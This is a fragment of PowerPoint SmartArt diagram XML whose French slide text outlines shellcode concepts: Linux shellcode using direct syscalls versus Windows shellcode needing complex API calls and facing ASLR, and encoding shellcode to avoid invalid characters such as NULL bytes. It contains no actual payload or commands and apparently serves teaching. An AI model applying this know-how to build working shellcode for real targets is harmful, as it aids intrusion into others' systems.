    <dgm:cxn modelId="{91502B80-3D9C-7C4E-983B-184C454CA14B}" type="presParOf" srcId="{E16CE82E-5577-B34C-884C-BA8004A5F2BD}" destId="{CB42D5C5-67E4-924C-B519-C43B9E5E18CD}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{D6AFFD99-B3F4-F947-A382-E9BBE444226F}" type="presParOf" srcId="{E16CE82E-5577-B34C-884C-BA8004A5F2BD}" destId="{8B1714A6-D320-384D-9E45-EBBFBB92C7A6}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{385C4358-A6DE-B845-B36A-A0E29ADAD59B}" type="presParOf" srcId="{277AD1FB-E280-614E-8F29-FA833929F772}" destId="{E193A492-85AB-7443-8155-A2400E12ACDC}" srcOrd="13" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{A0F0E053-AE6E-9C49-8459-0CB50E60B4EC}" type="presParOf" srcId="{277AD1FB-E280-614E-8F29-FA833929F772}" destId="{694A654D-8F3A-A742-81FB-3805CA6D0CA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A1A75ABC-53B9-47AB-B347-2BE435614CA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200667B-A4F3-4244-85EB-53DA9AD794E3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Différences principales :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{594B47C2-9541-46BC-835C-8EB6D2D2FC63}" type="parTrans" cxnId="{DD72D306-BB37-435E-818A-6A585A97362E}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5E4F72BC-F4C1-4D02-8303-7D96A0288C97}" type="sibTrans" cxnId="{DD72D306-BB37-435E-818A-6A585A97362E}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A9211CA2-268F-41CE-8C4A-B6A5227BA5BF}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Linux :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0B108E95-9654-47B2-AF42-EDBC35F59D18}" type="parTrans" cxnId="{B0F499CB-630A-4AA3-BBE4-66F77975E7FE}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{CFB0653A-5B99-44E2-B81C-740E2582EBBB}" type="sibTrans" cxnId="{B0F499CB-630A-4AA3-BBE4-66F77975E7FE}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9AF1E48C-6109-484F-AB49-D197D39B3029}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Utilisation directe des appels système (syscalls).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{10CEBA26-19B7-4469-B0F9-2240F21B6CDF}" type="parTrans" cxnId="{0B34D772-9522-4023-85FD-8827C42635D8}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7D59D19E-3412-4F62-87D1-0DE71FB08E78}" type="sibTrans" cxnId="{0B34D772-9522-4023-85FD-8827C42635D8}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{37E251AD-F908-4735-B073-F928EB035DEF}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Plus simple et plus compact (en general).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{CE25EB5B-B069-4578-80F7-E3F1A8169E89}" type="parTrans" cxnId="{ECB5A5C0-F3FA-4BFD-8972-E025E0E0215B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{902377A9-9036-4F66-ACB7-FBF45653E4B4}" type="sibTrans" cxnId="{ECB5A5C0-F3FA-4BFD-8972-E025E0E0215B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2DDBD02E-F6DC-41F4-AFCE-573F0234AC96}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Windows :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{79570DBD-FB2C-43F5-BAC8-E8D7EAF3C165}" type="parTrans" cxnId="{CA274D14-16CE-4EC8-97D2-9072D44C288F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{50124152-5EC5-4EB7-86A3-6A0435349416}" type="sibTrans" cxnId="{CA274D14-16CE-4EC8-97D2-9072D44C288F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B126CE0D-24AA-4EA4-B1DA-4E6913A0173A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Nécessite des appels API complexes.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E199A7E6-9750-4041-BE81-1F5CE8242211}" type="parTrans" cxnId="{079C81B0-2C88-465A-A833-0EF0119065A4}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{412CC642-7508-4214-A8C0-1EF2CF447F48}" type="sibTrans" cxnId="{079C81B0-2C88-465A-A833-0EF0119065A4}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{572F79FA-EE88-4A39-82C1-1E1886744334}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Dépend des adresses mémoire dynamiques (ASLR).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{CBA41571-36A5-40BE-861F-95C56FF841D0}" type="parTrans" cxnId="{31A77A09-FE9A-40B8-81E2-49C18878F4E5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D9E65A0D-FBF1-4B5C-901D-900663C90456}" type="sibTrans" cxnId="{31A77A09-FE9A-40B8-81E2-49C18878F4E5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4CD0480B-A03E-1D4B-A381-07F304062741}" type="pres">
      <dgm:prSet presAssocID="{A1A75ABC-53B9-47AB-B347-2BE435614CA3}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{24BF717A-6381-5641-9ABF-4E277C70C1ED}" type="pres">
      <dgm:prSet presAssocID="{C200667B-A4F3-4244-85EB-53DA9AD794E3}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{949FAF71-4290-D44A-8CB8-A7FF930B864A}" type="pres">
      <dgm:prSet presAssocID="{C200667B-A4F3-4244-85EB-53DA9AD794E3}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{4A8EF8AC-B4A5-5343-B185-5BA189C3FD36}" type="pres">
      <dgm:prSet presAssocID="{C200667B-A4F3-4244-85EB-53DA9AD794E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0C4C0BC-B8C2-3A4A-B755-6A1261418EC3}" type="pres">
      <dgm:prSet presAssocID="{C200667B-A4F3-4244-85EB-53DA9AD794E3}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{9D8C2841-52E6-C242-8E94-F79CF9B5D16A}" type="pres">
      <dgm:prSet presAssocID="{C200667B-A4F3-4244-85EB-53DA9AD794E3}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{0CFFE838-2F9C-404E-85B2-C6AF2AD74E44}" type="pres">
      <dgm:prSet presAssocID="{5E4F72BC-F4C1-4D02-8303-7D96A0288C97}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{FB00C4ED-54CD-4A42-9288-623D603AB9A9}" type="pres">
      <dgm:prSet presAssocID="{A9211CA2-268F-41CE-8C4A-B6A5227BA5BF}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{30C9069B-6589-5E44-A568-8025AA9106D6}" type="pres">
      <dgm:prSet presAssocID="{A9211CA2-268F-41CE-8C4A-B6A5227BA5BF}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{D72AE237-9968-BB45-B8C1-3715E7EB24C4}" type="pres">
      <dgm:prSet presAssocID="{A9211CA2-268F-41CE-8C4A-B6A5227BA5B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C8AC4F8-A51E-1942-B38D-FB609C4438E0}" type="pres">
      <dgm:prSet presAssocID="{A9211CA2-268F-41CE-8C4A-B6A5227BA5BF}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{19FC573E-97C3-5F4B-9591-A52A3D86A0DA}" type="pres">
      <dgm:prSet presAssocID="{A9211CA2-268F-41CE-8C4A-B6A5227BA5BF}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="1" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{D597D3CC-B53B-8942-8AD6-8E0C87EAC4F8}" type="pres">
      <dgm:prSet presAssocID="{CFB0653A-5B99-44E2-B81C-740E2582EBBB}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5C99CC4E-C520-884C-98DD-7E5F19E522EB}" type="pres">
      <dgm:prSet presAssocID="{2DDBD02E-F6DC-41F4-AFCE-573F0234AC96}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{878CC4B2-E3B6-5346-B287-CD5D3ACEDD5C}" type="pres">
      <dgm:prSet presAssocID="{2DDBD02E-F6DC-41F4-AFCE-573F0234AC96}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="1" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{D2DAC597-A6AC-F942-847F-3EA06C364EC4}" type="pres">
      <dgm:prSet presAssocID="{2DDBD02E-F6DC-41F4-AFCE-573F0234AC9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4517311-09F9-5742-ACF3-28628B9629C1}" type="pres">
      <dgm:prSet presAssocID="{2DDBD02E-F6DC-41F4-AFCE-573F0234AC96}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A5348B05-8607-FB40-97BA-40034E8AE817}" type="pres">
      <dgm:prSet presAssocID="{2DDBD02E-F6DC-41F4-AFCE-573F0234AC9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D72D306-BB37-435E-818A-6A585A97362E}" srcId="{A1A75ABC-53B9-47AB-B347-2BE435614CA3}" destId="{C200667B-A4F3-4244-85EB-53DA9AD794E3}" srcOrd="0" destOrd="0" parTransId="{594B47C2-9541-46BC-835C-8EB6D2D2FC63}" sibTransId="{5E4F72BC-F4C1-4D02-8303-7D96A0288C97}"/>
    <dgm:cxn modelId="{31A77A09-FE9A-40B8-81E2-49C18878F4E5}" srcId="{2DDBD02E-F6DC-41F4-AFCE-573F0234AC96}" destId="{572F79FA-EE88-4A39-82C1-1E1886744334}" srcOrd="1" destOrd="0" parTransId="{CBA41571-36A5-40BE-861F-95C56FF841D0}" sibTransId="{D9E65A0D-FBF1-4B5C-901D-900663C90456}"/>
    <dgm:cxn modelId="{CA274D14-16CE-4EC8-97D2-9072D44C288F}" srcId="{A1A75ABC-53B9-47AB-B347-2BE435614CA3}" destId="{2DDBD02E-F6DC-41F4-AFCE-573F0234AC96}" srcOrd="2" destOrd="0" parTransId="{79570DBD-FB2C-43F5-BAC8-E8D7EAF3C165}" sibTransId="{50124152-5EC5-4EB7-86A3-6A0435349416}"/>
    <dgm:cxn modelId="{0C4EC047-21B9-9940-804A-C3FA83C9C268}" type="presOf" srcId="{572F79FA-EE88-4A39-82C1-1E1886744334}" destId="{A5348B05-8607-FB40-97BA-40034E8AE817}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{EB658956-0C9C-3B46-A397-4AC9B7237D0D}" type="presOf" srcId="{C200667B-A4F3-4244-85EB-53DA9AD794E3}" destId="{4A8EF8AC-B4A5-5343-B185-5BA189C3FD36}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{9A463C5A-AB01-DD43-852E-319F296329F4}" type="presOf" srcId="{B126CE0D-24AA-4EA4-B1DA-4E6913A0173A}" destId="{A5348B05-8607-FB40-97BA-40034E8AE817}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{AAA65B5D-6D50-4C4C-BE29-E175709FE714}" type="presOf" srcId="{37E251AD-F908-4735-B073-F928EB035DEF}" destId="{19FC573E-97C3-5F4B-9591-A52A3D86A0DA}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{0B34D772-9522-4023-85FD-8827C42635D8}" srcId="{A9211CA2-268F-41CE-8C4A-B6A5227BA5BF}" destId="{9AF1E48C-6109-484F-AB49-D197D39B3029}" srcOrd="0" destOrd="0" parTransId="{10CEBA26-19B7-4469-B0F9-2240F21B6CDF}" sibTransId="{7D59D19E-3412-4F62-87D1-0DE71FB08E78}"/>
    <dgm:cxn modelId="{0D461A8D-89BA-5D4D-8EA1-B0F968A90200}" type="presOf" srcId="{A9211CA2-268F-41CE-8C4A-B6A5227BA5BF}" destId="{D72AE237-9968-BB45-B8C1-3715E7EB24C4}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{4DB310A5-A4C2-3D4D-8258-BC0FB6EC957B}" type="presOf" srcId="{C200667B-A4F3-4244-85EB-53DA9AD794E3}" destId="{949FAF71-4290-D44A-8CB8-A7FF930B864A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{F7C21AB0-639D-774E-9133-3F4132E35A6E}" type="presOf" srcId="{A9211CA2-268F-41CE-8C4A-B6A5227BA5BF}" destId="{30C9069B-6589-5E44-A568-8025AA9106D6}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{079C81B0-2C88-465A-A833-0EF0119065A4}" srcId="{2DDBD02E-F6DC-41F4-AFCE-573F0234AC96}" destId="{B126CE0D-24AA-4EA4-B1DA-4E6913A0173A}" srcOrd="0" destOrd="0" parTransId="{E199A7E6-9750-4041-BE81-1F5CE8242211}" sibTransId="{412CC642-7508-4214-A8C0-1EF2CF447F48}"/>
    <dgm:cxn modelId="{4AC671B7-93BF-C34A-B2B8-C0D49DF6DD60}" type="presOf" srcId="{2DDBD02E-F6DC-41F4-AFCE-573F0234AC96}" destId="{878CC4B2-E3B6-5346-B287-CD5D3ACEDD5C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{8AF23EBA-0033-1B40-B60E-CCAAF2B7C715}" type="presOf" srcId="{A1A75ABC-53B9-47AB-B347-2BE435614CA3}" destId="{4CD0480B-A03E-1D4B-A381-07F304062741}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{B84E95BA-0B70-F543-9A61-8A0DCA717FB1}" type="presOf" srcId="{9AF1E48C-6109-484F-AB49-D197D39B3029}" destId="{19FC573E-97C3-5F4B-9591-A52A3D86A0DA}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{ECB5A5C0-F3FA-4BFD-8972-E025E0E0215B}" srcId="{A9211CA2-268F-41CE-8C4A-B6A5227BA5BF}" destId="{37E251AD-F908-4735-B073-F928EB035DEF}" srcOrd="1" destOrd="0" parTransId="{CE25EB5B-B069-4578-80F7-E3F1A8169E89}" sibTransId="{902377A9-9036-4F66-ACB7-FBF45653E4B4}"/>
    <dgm:cxn modelId="{B0F499CB-630A-4AA3-BBE4-66F77975E7FE}" srcId="{A1A75ABC-53B9-47AB-B347-2BE435614CA3}" destId="{A9211CA2-268F-41CE-8C4A-B6A5227BA5BF}" srcOrd="1" destOrd="0" parTransId="{0B108E95-9654-47B2-AF42-EDBC35F59D18}" sibTransId="{CFB0653A-5B99-44E2-B81C-740E2582EBBB}"/>
    <dgm:cxn modelId="{D1B808EF-F8F5-0345-A8BB-58C61ECF2E3B}" type="presOf" srcId="{2DDBD02E-F6DC-41F4-AFCE-573F0234AC96}" destId="{D2DAC597-A6AC-F942-847F-3EA06C364EC4}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{9DDBE513-B8AD-6B4F-887B-0C3EEAE442EF}" type="presParOf" srcId="{4CD0480B-A03E-1D4B-A381-07F304062741}" destId="{24BF717A-6381-5641-9ABF-4E277C70C1ED}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{43FEEB18-C5CC-634D-87FE-491F04E2233D}" type="presParOf" srcId="{24BF717A-6381-5641-9ABF-4E277C70C1ED}" destId="{949FAF71-4290-D44A-8CB8-A7FF930B864A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{2DC18DD8-9FC5-4C4F-A8F5-2FD5CC229F30}" type="presParOf" srcId="{24BF717A-6381-5641-9ABF-4E277C70C1ED}" destId="{4A8EF8AC-B4A5-5343-B185-5BA189C3FD36}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{8C5597BD-DCDD-994C-860B-B653960AB3EF}" type="presParOf" srcId="{4CD0480B-A03E-1D4B-A381-07F304062741}" destId="{30C4C0BC-B8C2-3A4A-B755-6A1261418EC3}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{F1AF54E5-BA1C-9249-A1E7-57C957DF44AC}" type="presParOf" srcId="{4CD0480B-A03E-1D4B-A381-07F304062741}" destId="{9D8C2841-52E6-C242-8E94-F79CF9B5D16A}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{16F3CDDB-FFB9-D640-87F7-5DC05E9A3029}" type="presParOf" srcId="{4CD0480B-A03E-1D4B-A381-07F304062741}" destId="{0CFFE838-2F9C-404E-85B2-C6AF2AD74E44}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{D8C87D0F-428A-5B44-9D7B-FBCDDCA8D3DD}" type="presParOf" srcId="{4CD0480B-A03E-1D4B-A381-07F304062741}" destId="{FB00C4ED-54CD-4A42-9288-623D603AB9A9}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{B83D1BBD-4826-5F41-A4F0-2EFE3288B0AA}" type="presParOf" srcId="{FB00C4ED-54CD-4A42-9288-623D603AB9A9}" destId="{30C9069B-6589-5E44-A568-8025AA9106D6}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{D83E754F-FD07-A14A-8837-0CDE51A9822D}" type="presParOf" srcId="{FB00C4ED-54CD-4A42-9288-623D603AB9A9}" destId="{D72AE237-9968-BB45-B8C1-3715E7EB24C4}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{FDE738A2-5B51-8243-834B-BD80AF1C1465}" type="presParOf" srcId="{4CD0480B-A03E-1D4B-A381-07F304062741}" destId="{6C8AC4F8-A51E-1942-B38D-FB609C4438E0}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{8FF05647-CA51-D54B-BAAA-3285FAB9C07F}" type="presParOf" srcId="{4CD0480B-A03E-1D4B-A381-07F304062741}" destId="{19FC573E-97C3-5F4B-9591-A52A3D86A0DA}" srcOrd="6" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{17402BE3-2490-D747-BD8E-47FB95140311}" type="presParOf" srcId="{4CD0480B-A03E-1D4B-A381-07F304062741}" destId="{D597D3CC-B53B-8942-8AD6-8E0C87EAC4F8}" srcOrd="7" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{EE6DF72C-38D3-5140-A719-4E03E9DFDB05}" type="presParOf" srcId="{4CD0480B-A03E-1D4B-A381-07F304062741}" destId="{5C99CC4E-C520-884C-98DD-7E5F19E522EB}" srcOrd="8" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{81A9C93B-1565-D640-82FE-8392A7F3D862}" type="presParOf" srcId="{5C99CC4E-C520-884C-98DD-7E5F19E522EB}" destId="{878CC4B2-E3B6-5346-B287-CD5D3ACEDD5C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{F4D3FE0E-6D87-7D4F-A9CD-D5136C05CE25}" type="presParOf" srcId="{5C99CC4E-C520-884C-98DD-7E5F19E522EB}" destId="{D2DAC597-A6AC-F942-847F-3EA06C364EC4}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{4ABC6D63-A4ED-DC4F-A81D-67B202435E36}" type="presParOf" srcId="{4CD0480B-A03E-1D4B-A381-07F304062741}" destId="{C4517311-09F9-5742-ACF3-28628B9629C1}" srcOrd="9" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{E05F27DF-E652-3D4A-81C6-4CA76ACA8C72}" type="presParOf" srcId="{4CD0480B-A03E-1D4B-A381-07F304062741}" destId="{A5348B05-8607-FB40-97BA-40034E8AE81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FD02F742-8708-411E-9D94-A8D80F1E11D3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05411BA-1273-4B02-B9C5-E2AE59B92367}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Pourquoi encoder les shellcodes ?</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{93118E22-F11F-4566-8026-29DDDAB7B2A0}" type="parTrans" cxnId="{3D6F8BC8-38DA-4A0D-8E8A-3A1BFDF05F71}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{BAC40E6F-712E-4F4B-A346-66B457C82B26}" type="sibTrans" cxnId="{3D6F8BC8-38DA-4A0D-8E8A-3A1BFDF05F71}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{57653F9E-6056-4272-816B-054945340807}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Problème :</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Les shellcodes contiennent souvent des caractères invalides (NULL, etc.).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0CF2E016-FE44-4F0E-A85D-E3A0E5293537}" type="parTrans" cxnId="{72198DC9-2CF5-47DE-B6CA-C29DEAB434DC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{903C6E98-7AE2-435B-8BD7-0D5530EE2A6E}" type="sibTrans" cxnId="{72198DC9-2CF5-47DE-B6CA-C29DEAB434DC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7B394847-528A-472F-B296-E48E77E29778}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Solution :</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Utilisation d’un encodage spécial pour contourner ces restrictions.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
